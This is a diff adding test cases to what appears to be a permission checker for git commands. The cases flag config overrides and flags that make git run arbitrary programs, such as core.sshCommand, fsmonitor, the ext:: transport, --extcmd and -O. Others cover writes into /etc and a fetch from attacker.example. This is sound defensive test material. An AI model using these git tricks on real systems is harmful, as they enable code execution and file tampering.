@@ -120,3 +120,119 @@ reason_contains = "outside allowed scope"
 command = "git --work-tree=/etc/checkout status"
 decision = "ask"
 reason_contains = "outside allowed scope"
+
+# ---- -c/--config-env overrides: allowlist, not denylist (#158) ----
+[[case]]
+command = "git -c core.pager=id log"
+decision = "ask"
+reason_contains = "not on the safe config allowlist"
+
+[[case]]
+command = "git -c core.fsmonitor=id status"
+decision = "ask"
+reason_contains = "not on the safe config allowlist"
+
+[[case]]
+command = "git -c core.sshCommand=id fetch"
+decision = "ask"
+reason_contains = "not on the safe config allowlist"
+
+[[case]]
+command = "git -c core.hooksPath=/tmp status"
+decision = "ask"
+reason_contains = "not on the safe config allowlist"
+
+[[case]]
+command = "git -c uploadpack.packObjectsHook=id log"
+decision = "ask"
+reason_contains = "not on the safe config allowlist"
+
+[[case]]
+command = "git -c protocol.ext.allow=always ls-remote ext::sh -c id"
+decision = "ask"
+reason_contains = "not on the safe config allowlist"
+
+[[case]]
+command = "git -c user.name=Bob status"
+decision = "allow"
+
+[[case]]
+command = "git -c color.ui=always diff"
+decision = "allow"
+
+# ---- safe subcommands with exec/write/egress flags (#158) ----
+[[case]]
+command = "git difftool --extcmd=id HEAD~1 HEAD"
+decision = "ask"
+reason_contains = "extcmd"
+
+[[case]]
+command = "git difftool HEAD~1 HEAD"
+decision = "allow"
+
+[[case]]
+command = "git grep --open-files-in-pager=id pat"
+decision = "ask"
+reason_contains = "open-files-in-pager"
+
+[[case]]
+command = "git grep -Oid pat"
+decision = "ask"
+reason_contains = "open-files-in-pager"
+
+[[case]]
+command = "git grep pat"
+decision = "allow"
+
+[[case]]
+command = "git archive -o /tmp/out.tar HEAD"
+decision = "allow"
+
+[[case]]
+command = "git archive -o /etc/evil.tar HEAD"
+decision = "ask"
+reason_contains = "redirect to /etc/evil.tar"
+
+[[case]]
+command = "git archive HEAD"
+decision = "allow"
+
+[[case]]
+command = "git diff --output=/tmp/evil HEAD"
+decision = "allow"
+
+[[case]]
+command = "git diff --output=/etc/evil HEAD"
+decision = "ask"
+reason_contains = "redirect to /etc/evil"
+
+[[case]]
+command = "git diff HEAD"
+decision = "allow"
+
+[[case]]
+command = "git diff --ext-diff"
+decision = "ask"
+reason_contains = "ext-diff"
+
+[[case]]
+command = "git format-patch -o /tmp/patches HEAD~3"
+decision = "allow"
+
+[[case]]
+command = "git format-patch -o /etc/patches HEAD~3"
+decision = "ask"
+reason_contains = "redirect to /etc/patches"
+
+[[case]]
+command = "git format-patch HEAD~3"
+decision = "allow"
+
+[[case]]
+command = "git fetch https://attacker.example/repo"
+decision = "ask"
+reason_contains = "remote URL"
+
+[[case]]
+command = "git fetch origin"
+decision = "allow"
